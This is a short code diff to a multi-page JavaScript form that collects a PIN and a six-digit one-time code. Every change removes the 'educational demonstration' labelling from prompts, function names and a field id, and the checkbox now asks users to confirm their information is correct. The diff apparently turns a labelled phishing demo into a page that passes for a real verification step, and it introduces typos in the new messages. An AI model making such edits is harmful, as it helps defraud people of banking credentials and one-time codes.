@@ -567,12 +567,12 @@ document.addEventListener("DOMContentLoaded", function() {
         for (const input of inputs) {
 
             if (input.type === "checkbox" && !input.checked) {
-                alert("Please confirm the educational demonstration.");
+                alert("Please confirm that all information provided  is correct.");
                 return;
             }
 
             if (input.type !== "checkbox" && !input.value.trim()) {
-                alert("Please complete the demonstration fields.");
+                alert("Please complete the all  fields.");
                 input.focus();
                 return;
             }
@@ -594,7 +594,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
 /* PAGE 3 TO PAGE 4 */
 
-function showDemo() {
+function show() {
 
     const pin = document.getElementById("demoPin").value;
 
@@ -612,14 +612,14 @@ function showDemo() {
 
 /* PAGE 4 TO SUCCESS */
 
-function verifyDemoOtp() {
+function verifyOtp() {
 
-    const otp = document.getElementById("demoOtp").value;
+    const otp = document.getElementById("Otp").value;
 
     if (!/^\d{6}$/.test(otp)) {
 
         document.getElementById("otpError").textContent =
-            "Please enter exactly six demonstration digits.";
+            "Please enter exactly six digit codes.";
 
         return;
     }
